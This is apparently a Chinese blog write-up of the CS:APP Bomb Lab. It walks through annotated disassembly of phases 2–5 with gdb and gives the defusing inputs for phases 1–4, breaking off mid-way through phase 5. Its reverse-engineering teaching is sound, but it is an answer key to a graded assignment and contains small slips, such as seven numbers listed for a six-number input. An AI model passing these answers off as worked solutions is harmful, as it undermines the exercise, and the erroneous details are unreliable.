
<ul>
<li><p>为了搞清楚这个过程，我们需要进行<code>gdb</code>调试，下面是一些<code>gdb</code>命令（列出来的我都用了）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb&gt; break *&lt;&lt;函数名&gt;+&lt;偏移值&gt;&gt;                             //设置断点</span><br><span class="line">gdb&gt; run                                                  //运行</span><br><span class="line">gdb&gt; step                                                 //下一步</span><br><span class="line">gdb&gt; info registers &lt;寄存器&gt;                               //列出寄存器的值，寄存器可选</span><br><span class="line">gdb&gt; set var &lt;寄存器或者变量&gt;=&lt;0x111&gt;                        //改变寄存器的值</span><br><span class="line">gdb&gt; set *&lt;内存地址&gt;=&lt;0x11&gt;                                 //改变内存的值</span><br><span class="line">gdb&gt; x/nfu &lt;内存地址&gt;                  //查看内存地址的值，examine简写为x，n长度，f显示格式，u一个地址单元的长度</span><br></pre></td></tr></table></figure></li>
<li><p>所以<code>phase_1</code>的过程就是：将<code>input</code>与<code>0x804a1c4</code>的字符串比较，如果想</p>
</li>
<li><p>执行命令，查看<code>0x804a1c4</code>地址的字符串<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210428220435495.png" alt="image-20210428220435495"></p>
</li>
<li><p>运行，输入与<code>0x804a1c4</code>地址的字符串相等的<code>input</code>字符串，提示炸弹已经被拆，下一关！<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210428220713564.png" alt="image-20210428220713564"></p>
</li>
</ul>
<h4 id="phase-2："><a href="#phase-2：" class="headerlink" title="phase_2："></a><code>phase_2</code>：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_2:      //函数phase_2(input)</span><br><span class="line">   0x08048b74 &lt;+0&gt;:	push   %esi                   //将程序的入口地址压入栈中</span><br><span class="line">   0x08048b75 &lt;+1&gt;:	push   %ebx                   //将被调用者保存寄存器中的值压入栈中，以便在返回前可以恢复它们</span><br><span class="line">   0x08048b76 &lt;+2&gt;:	sub    $0x34,%esp             //栈帧预留0x34字节空间</span><br><span class="line">   0x08048b79 &lt;+5&gt;:	lea    0x18(%esp),%eax        //eax=0x18+esp=a[]</span><br><span class="line">   0x08048b7d &lt;+9&gt;:	mov    %eax,0x4(%esp)         //M(0x4+esp)=eax=0x18+esp=a[]</span><br><span class="line">   0x08048b81 &lt;+13&gt;:	mov    0x40(%esp),%eax    //eax=M(0x40+esp)=input</span><br><span class="line">   0x08048b85 &lt;+17&gt;:	mov    %eax,(%esp)        //M(esp)=eax=input</span><br><span class="line">   0x08048b88 &lt;+20&gt;:	call   0x804922b &lt;read_six_numbers&gt;    //调用read_six_numbers(input,a[]=0x18+esp)</span><br><span class="line">   0x08048b8d &lt;+25&gt;:	cmpl   $0x1,0x18(%esp)    //compare M(0x18+esp) with 0x1</span><br><span class="line">   0x08048b92 &lt;+30&gt;:	je     0x8048b99 &lt;phase_2+37&gt; //if zf=1, jump 0x8048b99 &lt;phase_2+37&gt;</span><br><span class="line">   0x08048b94 &lt;+32&gt;:	call   0x80490f6 &lt;explode_bomb&gt; //调用explode_bomb()</span><br><span class="line">   0x08048b99 &lt;+37&gt;:	lea    0x1c(%esp),%ebx    //ebx=0x1c+esp=&amp;a[1]</span><br><span class="line">   0x08048b9d &lt;+41&gt;:	lea    0x30(%esp),%esi    //esi=0x30+esp=&amp;a[5]</span><br><span class="line">   0x08048ba1 &lt;+45&gt;:	mov    -0x4(%ebx),%eax    //eax=M(-0x4+ebx)</span><br><span class="line">   0x08048ba4 &lt;+48&gt;:	add    %eax,%eax          //eax=eax+eax=2*M(-0x4+ebx)</span><br><span class="line">   0x08048ba6 &lt;+50&gt;:	cmp    %eax,(%ebx)        //compare M(ebx) with eax=2*M(-0x4+ebx)</span><br><span class="line">   0x08048ba8 &lt;+52&gt;:	je     0x8048baf &lt;phase_2+59&gt; //if zf=1, jump 0x8048baf &lt;phase_2+59&gt;</span><br><span class="line">   0x08048baa &lt;+54&gt;:	call   0x80490f6 &lt;explode_bomb&gt; //调用&lt;explode_bomb&gt;函数</span><br><span class="line">   0x08048baf &lt;+59&gt;:	add    $0x4,%ebx          //ebx=ebx+4</span><br><span class="line">   0x08048bb2 &lt;+62&gt;:	cmp    %esi,%ebx          //compare ebx with esi=0x30+esp=&amp;a[5]</span><br><span class="line">   0x08048bb4 &lt;+64&gt;:	jne    0x8048ba1 &lt;phase_2+45&gt; //if zf=0, jump 0x8048ba1 &lt;phase_2+45&gt;</span><br><span class="line">   0x08048bb6 &lt;+66&gt;:	add    $0x34,%esp         //释放栈帧空间</span><br><span class="line">   0x08048bb9 &lt;+69&gt;:	pop    %ebx               //恢复ebx原先的数据</span><br><span class="line">   0x08048bba &lt;+70&gt;:	pop    %esi               //弹出程序的入口地址</span><br><span class="line">   0x08048bbb &lt;+71&gt;:	ret                       //返回地址出栈，并跳转到返回地址</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<ul>
<li>分析可得<code>phase_2</code>的过程是：输入6个数并将其地址保存在栈中，第一个数<code>a[0]</code>要等于1，否则爆炸；从第二个数<code>a[1]</code>开始，每个数都必须等于它前一个数的2倍，否则爆炸。</li>
<li>所以我们得到的六个数字是：<code>1 2 4 8 16 32 64</code>，测试，成功！<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210430085749377.png" alt="image-20210430085749377"></li>
</ul>
<h4 id="phase-3："><a href="#phase-3：" class="headerlink" title="phase_3："></a><code>phase_3</code>：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_3:         //函数phase_3(input)</span><br><span class="line">   0x08048bbc &lt;+0&gt;:	    sub    $0x2c,%esp            //栈帧预留0x2c字节的空间</span><br><span class="line">   0x08048bbf &lt;+3&gt;:	    lea    0x1c(%esp),%eax       //eax=0x1c+esp</span><br><span class="line">   0x08048bc3 &lt;+7&gt;:	    mov    %eax,0xc(%esp)        //M(0xc+esp)=eax</span><br><span class="line">   0x08048bc7 &lt;+11&gt;:	lea    0x18(%esp),%eax       //eax=0x18+esp</span><br><span class="line">   0x08048bcb &lt;+15&gt;:	mov    %eax,0x8(%esp)        //M(0x8+esp)=eax</span><br><span class="line">   0x08048bcf &lt;+19&gt;:	movl   $0x804a3e3,0x4(%esp)  //M(0x4+esp)=0x804a3e3</span><br><span class="line">   0x08048bd7 &lt;+27&gt;:	mov    0x30(%esp),%eax       //eax=M(0x30+esp)=input</span><br><span class="line">   0x08048bdb &lt;+31&gt;:	mov    %eax,(%esp)           //M(esp)=M(0x30+esp)=input</span><br><span class="line">   0x08048bde &lt;+34&gt;:	call   0x8048870 &lt;__isoc99_sscanf@plt&gt;  //调用__isoc99_sscanf@plt(input,0x804a3e3,0x18+esp，0x1c+esp)</span><br><span class="line">   0x08048be3 &lt;+39&gt;:	cmp    $0x1,%eax             //compare eax with 0x1,eax返回值是参数个数</span><br><span class="line">   0x08048be6 &lt;+42&gt;:	jg     0x8048bed &lt;phase_3+49&gt;  //if eax&gt;0x1, jump 0x8048bed &lt;phase_3+49&gt;</span><br><span class="line">   0x08048be8 &lt;+44&gt;:	call   0x80490f6 &lt;explode_bomb&gt;  //调用explode_bomb()</span><br><span class="line">   0x08048bed &lt;+49&gt;:	cmpl   $0x7,0x18(%esp)        //compare M(0x18+esp) with 0x7</span><br><span class="line">   0x08048bf2 &lt;+54&gt;:	ja     0x8048c30 &lt;phase_3+116&gt; //if M(0x18+esp)&gt;0x7, jump 0x8048c30&lt;phase_3+116&gt;</span><br><span class="line">   0x08048bf4 &lt;+56&gt;:	mov    0x18(%esp),%eax       //eax=M(0x18+esp)</span><br><span class="line">   0x08048bf8 &lt;+60&gt;:	jmp    *0x804a220(,%eax,4)   //jump M(0x804a220+4*eax)</span><br><span class="line">   0x08048bff &lt;+67&gt;:	mov    $0x32d,%eax           //eax=0x32d</span><br><span class="line">   0x08048c04 &lt;+72&gt;:	jmp    0x8048c41 &lt;phase_3+133&gt;  //jump 0x8048c41 &lt;phase_3+133&gt;</span><br><span class="line">   0x08048c06 &lt;+74&gt;:	mov    $0x36c,%eax           //eax=0x36c</span><br><span class="line">   0x08048c0b &lt;+79&gt;:	jmp    0x8048c41 &lt;phase_3+133&gt;  //jump 0x8048c41 &lt;phase_3+133&gt;</span><br><span class="line">   0x08048c0d &lt;+81&gt;:	mov    $0x3db,%eax           //eax=0x3db</span><br><span class="line">   0x08048c12 &lt;+86&gt;:	jmp    0x8048c41 &lt;phase_3+133&gt;  //jump 0x8048c41 &lt;phase_3+133&gt;</span><br><span class="line">   0x08048c14 &lt;+88&gt;:	mov    $0x16d,%eax           //eax=0x16d</span><br><span class="line">   0x08048c19 &lt;+93&gt;:	jmp    0x8048c41 &lt;phase_3+133&gt;  //jump 0x8048c41 &lt;phase_3+133&gt;</span><br><span class="line">   0x08048c1b &lt;+95&gt;:	mov    $0x3d1,%eax            //eax=0x3d1</span><br><span class="line">   0x08048c20 &lt;+100&gt;:	jmp    0x8048c41 &lt;phase_3+133&gt;  //jump 0x8048c41 &lt;phase_3+133&gt;</span><br><span class="line">   0x08048c22 &lt;+102&gt;:	mov    $0x3cb,%eax            //eax=0x3cb</span><br><span class="line">   0x08048c27 &lt;+107&gt;:	jmp    0x8048c41 &lt;phase_3+133&gt;  //jump 0x8048c41 &lt;phase_3+133&gt;</span><br><span class="line">   0x08048c29 &lt;+109&gt;:	mov    $0x21c,%eax            //eax=0x21c</span><br><span class="line">   0x08048c2e &lt;+114&gt;:	jmp    0x8048c41 &lt;phase_3+133&gt;  //jump 0x8048c41 &lt;phase_3+133&gt;</span><br><span class="line">   0x08048c30 &lt;+116&gt;:	call   0x80490f6 &lt;explode_bomb&gt; //调用explode_bomb()</span><br><span class="line">   0x08048c35 &lt;+121&gt;:	mov    $0x0,%eax              //eax=0x0</span><br><span class="line">   0x08048c3a &lt;+126&gt;:	jmp    0x8048c41 &lt;phase_3+133&gt;  //jump 0x8048c41 &lt;phase_3+133&gt;</span><br><span class="line">   0x08048c3c &lt;+128&gt;:	mov    $0x283,%eax            //eax=0x283</span><br><span class="line">   0x08048c41 &lt;+133&gt;:	cmp    0x1c(%esp),%eax        //compare eax with M(0x1c+esp)</span><br><span class="line">   0x08048c45 &lt;+137&gt;:	je     0x8048c4c &lt;phase_3+144&gt; //if zf=1, jump 0x8048c4c &lt;phase_3+144&gt;</span><br><span class="line">   0x08048c47 &lt;+139&gt;:	call   0x80490f6 &lt;explode_bomb&gt;  //调用explode_bomb()</span><br><span class="line">   0x08048c4c &lt;+144&gt;:	add    $0x2c,%esp             //释放栈帧空间</span><br><span class="line">   0x08048c4f &lt;+147&gt;:	ret                           //返回地址出栈，并跳转到返回地址</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<ul>
<li><code>__isoc99_sscanf@plt</code>的第二个参数是<code>0x804a3e3</code>，以字符串的形式查看内存，所以我们知道后两个参数地址存的都是整数。<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210430191833050.png" alt="image-20210430191833050">、</li>
<li><code>0x08048bed &lt;+49&gt;:    cmpl   $0x7,0x18(%esp)</code>可知，第一个整数范围是0-7，不能是负数因为<code>ja</code>是无符号比较，出范围就爆炸</li>
<li><code>0x08048bf8 &lt;+60&gt;:    jmp    *0x804a220(,%eax,4)</code>可知，根据第一个整数，决定跳转到什么位置<ul>
<li>查看这8个不同跳转位置<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210430200908533.png" alt="image-20210430200908533"></li>
<li>因此我们得到了八个不同的输入组合：<br><code>0 813</code>、<code>1  643</code>、<code>2  876</code>、<code>3  987</code>、<code>4  365</code>、<code>5  977</code>、<code>6  971</code>、<code>7 540 </code></li>
<li>经验证，这几个都是符合的答案</li>
</ul>
</li>
<li>我们选<code>0 813</code>输入，输出成功拆除的提示语，第三关结束。<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210430204301058.png" alt="image-20210430204301058"></li>
</ul>
<h4 id="phase-4："><a href="#phase-4：" class="headerlink" title="phase_4："></a><code>phase_4</code>：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:               //函数phase(input)</span><br><span class="line">   0x08048cb9 &lt;+0&gt;:	    sub    $0x2c,%esp                  //栈帧预留0x2c字节的空间</span><br><span class="line">   0x08048cbc &lt;+3&gt;:	    lea    0x1c(%esp),%eax             //eax=0x1c+esp</span><br><span class="line">   0x08048cc0 &lt;+7&gt;:	    mov    %eax,0xc(%esp)              //M(0xc+esp)=eax</span><br><span class="line">   0x08048cc4 &lt;+11&gt;:	lea    0x18(%esp),%eax             //eax=0x18+esp</span><br><span class="line">   0x08048cc8 &lt;+15&gt;:	mov    %eax,0x8(%esp)              //M(0x8+esp)=eax</span><br><span class="line">   0x08048ccc &lt;+19&gt;:	movl   $0x804a3e3,0x4(%esp)        //M(0x4+esp)=0x804a3e3</span><br><span class="line">   0x08048cd4 &lt;+27&gt;:	mov    0x30(%esp),%eax             //eax=M(0x30+esp)=input</span><br><span class="line">   0x08048cd8 &lt;+31&gt;:	mov    %eax,(%esp)                 //M(esp)=input</span><br><span class="line">   0x08048cdb &lt;+34&gt;:	call   0x8048870 &lt;__isoc99_sscanf@plt&gt; //调用__isoc99_sscanf@plt(input,0x804a3e3,0x18+esp,0x1c+esp)</span><br><span class="line">   0x08048ce0 &lt;+39&gt;:	cmp    $0x2,%eax                   //compare eax with 0x2</span><br><span class="line">   0x08048ce3 &lt;+42&gt;:	jne    0x8048cf2 &lt;phase_4+57&gt;      //if zf=0, jump 0x8048cf2 &lt;phase_4+57&gt;</span><br><span class="line">   0x08048ce5 &lt;+44&gt;:	mov    0x18(%esp),%eax             //eax=M(0x18+esp)</span><br><span class="line">   0x08048ce9 &lt;+48&gt;:	test   %eax,%eax                   //eax &amp; eax</span><br><span class="line">   0x08048ceb &lt;+50&gt;:	js     0x8048cf2 &lt;phase_4+57&gt;      //if sf=1, jump 0x8048cf2 &lt;phase_4+57&gt;</span><br><span class="line">   0x08048ced &lt;+52&gt;:	cmp    $0xe,%eax                   //compare eax with 0xe</span><br><span class="line">   0x08048cf0 &lt;+55&gt;:	jle    0x8048cf7 &lt;phase_4+62&gt;      //if eax&lt;=0xe, jump 0x8048cf7 &lt;phase_4+62&gt;</span><br><span class="line">   0x08048cf2 &lt;+57&gt;:	call   0x80490f6 &lt;explode_bomb&gt;    //调用explode_bomb()</span><br><span class="line">   0x08048cf7 &lt;+62&gt;:	movl   $0xe,0x8(%esp)              //M(0x8+esp)=0xe</span><br><span class="line">   0x08048cff &lt;+70&gt;:	movl   $0x0,0x4(%esp)              //M(0x4+esp)=0x0</span><br><span class="line">   0x08048d07 &lt;+78&gt;:	mov    0x18(%esp),%eax             //eax=M(0x18+esp)</span><br><span class="line">   0x08048d0b &lt;+82&gt;:	mov    %eax,(%esp)                 //M(esp)=eax</span><br><span class="line">   0x08048d0e &lt;+85&gt;:	call   0x8048c50 &lt;func4&gt;           //调用fun4(M(0x18+esp), 0x0, 0xe)</span><br><span class="line">   0x08048d13 &lt;+90&gt;:	cmp    $0x15,%eax                  //compare eax with 0x15</span><br><span class="line">   0x08048d16 &lt;+93&gt;:	jne    0x8048d1f &lt;phase_4+102&gt;     //if zf=0, jump 0x8048d1f &lt;phase_4+102&gt;</span><br><span class="line">   0x08048d18 &lt;+95&gt;:	cmpl   $0x15,0x1c(%esp)            //compare M(0x1c+esp) with 0x15</span><br><span class="line">   0x08048d1d &lt;+100&gt;:	je     0x8048d24 &lt;phase_4+107&gt;     //if zf=1, jump 0x8048d24 &lt;phase_4+107&gt;</span><br><span class="line">   0x08048d1f &lt;+102&gt;:	call   0x80490f6 &lt;explode_bomb&gt;    //调用explode_bomb()</span><br><span class="line">   0x08048d24 &lt;+107&gt;:	add    $0x2c,%esp                  //栈帧释放空间</span><br><span class="line">   0x08048d27 &lt;+110&gt;:	ret                                //返回地址出栈，并跳转到返回地址</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看<code>scanf</code>的参数，在<code>0x804a3e3</code>以字符串的形式输出，我们看到是两个整数</p>
<p><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210430230148066.png" alt="image-20210430230148066"></p>
</li>
<li><p><code>0x08048d18 &lt;+95&gt;:    cmpl   $0x15,0x1c(%esp)</code><br>我们分析<code>M(0x1c+%esp)</code>要等于<code>0x15</code></p>
</li>
<li><p><code>0x08048d13 &lt;+90&gt;:    cmp    $0x15,%eax</code><br>我们需要知道<code>M(0x18+%esp)</code>到底等于多少，才能作为参数让<code>fun4(M(0x18+esp), 0x0, 0xe)</code>的返回值等于<code>0x15</code></p>
</li>
</ul>
<h5 id="func4"><a href="#func4" class="headerlink" title="func4"></a><code>func4</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function func4:                  //函数fun4(x,second,third)</span><br><span class="line">   0x08048c50 &lt;+0&gt;:	sub    $0x1c,%esp                       //栈帧预留0x1c字节的空间</span><br><span class="line">   0x08048c53 &lt;+3&gt;:	    mov    %ebx,0x14(%esp)              //M(0x14+esp)=ebx</span><br><span class="line">   0x08048c57 &lt;+7&gt;:	    mov    %esi,0x18(%esp)              //M(0x18+esp)=esi</span><br><span class="line">   0x08048c5b &lt;+11&gt;:	mov    0x20(%esp),%eax              //eax=M(0x20+esp)=x</span><br><span class="line">   0x08048c5f &lt;+15&gt;:	mov    0x24(%esp),%edx              //edx=M(0x24+esp)=second</span><br><span class="line">   0x08048c63 &lt;+19&gt;:	mov    0x28(%esp),%esi              //esi=M(0x28+esp)=third</span><br><span class="line">   0x08048c67 &lt;+23&gt;:	mov    %esi,%ecx                    //ecx=esi=third</span><br><span class="line">   0x08048c69 &lt;+25&gt;:	sub    %edx,%ecx                    //ecx=ecx-edx=third-second</span><br><span class="line">   0x08048c6b &lt;+27&gt;:	mov    %ecx,%ebx                    //ebx=ecx=third-second</span><br><span class="line">   0x08048c6d &lt;+29&gt;:	shr    $0x1f,%ebx                   //ebx逻辑右移31位,ebx=(third-second)&lt;0 ? 1:0</span><br><span class="line">   0x08048c70 &lt;+32&gt;:	add    %ebx,%ecx             //ecx=ebx+ecx=third-second+(third-second)&lt;0 ? 1:0</span><br><span class="line">   0x08048c72 &lt;+34&gt;:	sar    %ecx                         //ecx默认算术右移1位,ecx=ecx/2</span><br><span class="line">   0x08048c74 &lt;+36&gt;:	lea    (%ecx,%edx,1),%ebx           //ebx=ecx+edx=ecx+second=average</span><br><span class="line">   0x08048c77 &lt;+39&gt;:	cmp    %eax,%ebx                    //compare ebx=average with eax=x</span><br><span class="line">   0x08048c79 &lt;+41&gt;:	jle    0x8048c92 &lt;func4+66&gt;   //if ebx=average&lt;=eax=x, jump 0x8048c92 &lt;func4+66&gt;</span><br><span class="line">   0x08048c7b &lt;+43&gt;:	lea    -0x1(%ebx),%ecx              //ecx=-0x1+ebx=average-1</span><br><span class="line">   0x08048c7e &lt;+46&gt;:	mov    %ecx,0x8(%esp)               //M(0x8+esp)=ecx=average-1</span><br><span class="line">   0x08048c82 &lt;+50&gt;:	mov    %edx,0x4(%esp)               //M(0x4+esp)=edx=second</span><br><span class="line">   0x08048c86 &lt;+54&gt;:	mov    %eax,(%esp)                  //M(esp)=eax=x</span><br><span class="line">   0x08048c89 &lt;+57&gt;:	call   0x8048c50 &lt;func4&gt;            //调用fun4(x,second,average-1)</span><br><span class="line">   0x08048c8e &lt;+62&gt;:	add    %eax,%ebx                 //ebx=ebx+eax=average+fun4(x,second,average-1)</span><br><span class="line">   0x08048c90 &lt;+64&gt;:	jmp    0x8048cab &lt;func4+91&gt;         //jump 0x8048cab &lt;func4+91&gt;</span><br><span class="line">   0x08048c92 &lt;+66&gt;:	cmp    %eax,%ebx                    //compare ebx=average with eax=x</span><br><span class="line">   0x08048c94 &lt;+68&gt;:	jge    0x8048cab &lt;func4+91&gt;   //if ebx=average&gt;=eax=x, jump 0x8048cab &lt;func4+91&gt; </span><br><span class="line">   0x08048c96 &lt;+70&gt;:	mov    %esi,0x8(%esp)               //M(0x8+esp)=esi=third</span><br><span class="line">   0x08048c9a &lt;+74&gt;:	lea    0x1(%ebx),%edx               //edx=0x1+ebx=average+1</span><br><span class="line">   0x08048c9d &lt;+77&gt;:	mov    %edx,0x4(%esp)               //M(0x4+esp)=edx=average+1</span><br><span class="line">   0x08048ca1 &lt;+81&gt;:	mov    %eax,(%esp)                  //M(esp)=eax=x</span><br><span class="line">   0x08048ca4 &lt;+84&gt;:	call   0x8048c50 &lt;func4&gt;            //调用fun4(x,average+1,third)</span><br><span class="line">   0x08048ca9 &lt;+89&gt;:	add    %eax,%ebx                   //ebx=ebx+eax=average+fun4(x,average+1,third)</span><br><span class="line">   0x08048cab &lt;+91&gt;:	mov    %ebx,%eax                    //eax=ebx</span><br><span class="line">   0x08048cad &lt;+93&gt;:	mov    0x14(%esp),%ebx              //ebx=M(0x14+esp)</span><br><span class="line">   0x08048cb1 &lt;+97&gt;:	mov    0x18(%esp),%esi              //esi=M(0x18+esp)</span><br><span class="line">   0x08048cb5 &lt;+101&gt;:	add    $0x1c,%esp                   //栈帧释放空间</span><br><span class="line">   0x08048cb8 &lt;+104&gt;:	ret                                 //返回地址出栈，并跳转到返回地址</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<ul>
<li>我们将<code>fun4</code>函数翻译成C语言代码，主函数遍历<code>func4</code>第一个参数<code>x</code>，如果返回值等于<code>0x15</code>也就是<code>21</code>，那就是正确答案</li>
</ul>
<h5 id="func4转换成C语言："><a href="#func4转换成C语言：" class="headerlink" title="func4转换成C语言："></a><code>func4</code>转换成C语言：</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> second, <span class="keyword">int</span> third)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> average = second + (third - second + ((third - second) &lt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>)) / <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; average) &#123;</span><br><span class="line">		<span class="keyword">return</span> average + <span class="built_in">func4</span>(x, second, average - <span class="number">1</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; average) &#123;</span><br><span class="line">		<span class="keyword">return</span> average + <span class="built_in">func4</span>(x, average + <span class="number">1</span>, third);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> average;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">func4</span>(i, <span class="number">0</span>, <span class="number">15</span>) == <span class="number">21</span>)</span><br><span class="line">			cout &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>输出结果如下：<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210501104004856.png" alt="image-20210501104004856"></li>
<li>所以第四关答案为：<code>6 21</code>，输入验证，输出过关提示语<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210501104406772.png" alt="image-20210501104406772"></li>
</ul>
<h4 id="phase-5："><a href="#phase-5：" class="headerlink" title="phase_5："></a><code>phase_5</code>：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_5:                     //函数phase_5(input)</span><br><span class="line">   0x08048d28 &lt;+0&gt;:	sub    $0x2c,%esp                            //栈帧预留0x2c字节的空间</span><br><span class="line">   0x08048d2b &lt;+3&gt;:	    lea    0x1c(%esp),%eax                   //eax=0x1c+esp</span><br><span class="line">   0x08048d2f &lt;+7&gt;:	    mov    %eax,0xc(%esp)                    //M(0xc+esp)=eax=0x1c+esp</span><br><span class="line">   0x08048d33 &lt;+11&gt;:	lea    0x18(%esp),%eax                   //eax=0x18+esp</span><br><span class="line">   0x08048d37 &lt;+15&gt;:	mov    %eax,0x8(%esp)                    //M(0x8+esp)=eax=0x18+esp</span><br><span class="line">   0x08048d3b &lt;+19&gt;:	movl   $0x804a3e3,0x4(%esp)              //M(0x4+esp)=0x804a3e3</span><br><span class="line">   0x08048d43 &lt;+27&gt;:	mov    0x30(%esp),%eax                   //eax=M(0x30+esp)=input</span><br><span class="line">   0x08048d47 &lt;+31&gt;:	mov    %eax,(%esp)                       //M(esp)=eax=input</span><br><span class="line">   0x08048d4a &lt;+34&gt;:	call   0x8048870 &lt;__isoc99_sscanf@plt&gt;   //调用__isoc99_sscanf@plt(input,0x804a3e3,0x18+esp,0x1c+esp)</span><br><span class="line">   0x08048d4f &lt;+39&gt;:	cmp    $0x1,%eax                         //compare eax with 0x1</span><br><span class="line">   0x08048d52 &lt;+42&gt;:	jg     0x8048d59 &lt;phase_5+49&gt;          //if eax&gt;0x1, jump 0x8048d59 &lt;phase_5+49&gt;</span><br><span class="line">   0x08048d54 &lt;+44&gt;:	call   0x80490f6 &lt;explode_bomb&gt;          //调用explode_bomb()</span><br><span class="line">   0x08048d59 &lt;+49&gt;:	mov    0x18(%esp),%eax                   //eax=M(0x18+esp)</span><br><span class="line">   0x08048d5d &lt;+53&gt;:	and    $0xf,%eax                         //eax=eax &amp; 0xf</span><br><span class="line">   0x08048d60 &lt;+56&gt;:	mov    %eax,0x18(%esp)                   //M(0x18+esp)=eax</span><br><span class="line">   0x08048d64 &lt;+60&gt;:	cmp    $0xf,%eax                         //compare eax with 0xf</span><br><span class="line">   0x08048d67 &lt;+63&gt;:	je     0x8048d93 &lt;phase_5+107&gt;           //if zf=1, jump 0x8048d93 &lt;phase_5+107&gt;</span><br><span class="line">   0x08048d69 &lt;+65&gt;:	mov    $0x0,%ecx                         //ecx=0x0</span><br><span class="line">   0x08048d6e &lt;+70&gt;:	mov    $0x0,%edx                         //edx=0x0</span><br><span class="line">   0x08048d73 &lt;+75&gt;:	add    $0x1,%edx                         //edx=edx+1</span><br><span class="line">   0x08048d76 &lt;+78&gt;:	mov    0x804a240(,%eax,4),%eax           //eax=M(0x804a240+4*eax)=array[eax]</span><br><span class="line">   0x08048d7d &lt;+85&gt;:	add    %eax,%ecx                         //ecx=ecx+eax</span><br><span class="line">   0x08048d7f &lt;+87&gt;:	cmp    $0xf,%eax                         //compare eax with 0xf</span><br><span class="line">   0x08048d82 &lt;+90&gt;:	jne    0x8048d73 &lt;phase_5+75&gt;            //if zf=0, jump 0x8048d73 &lt;phase_5+75&gt;</span><br><span class="line">   0x08048d84 &lt;+92&gt;:	mov    %eax,0x18(%esp)                   //M(0x18+esp)=eax</span><br><span class="line">   0x08048d88 &lt;+96&gt;:	cmp    $0xf,%edx                         //compare edx with 0xf</span><br><span class="line">   0x08048d8b &lt;+99&gt;:	jne    0x8048d93 &lt;phase_5+107&gt;           //if zf=0, jump 0x8048d93 &lt;phase_5+107&gt;</span><br><span class="line">   0x08048d8d &lt;+101&gt;:	cmp    0x1c(%esp),%ecx                   //compare ecx with M(0x1c+esp)</span><br><span class="line">   0x08048d91 &lt;+105&gt;:	je     0x8048d98 &lt;phase_5+112&gt;           //if zf=1, jump 0x8048d98 &lt;phase_5+112&gt; </span><br><span class="line">   0x08048d93 &lt;+107&gt;:	call   0x80490f6 &lt;explode_bomb&gt;          //调用explode_bomb()</span><br><span 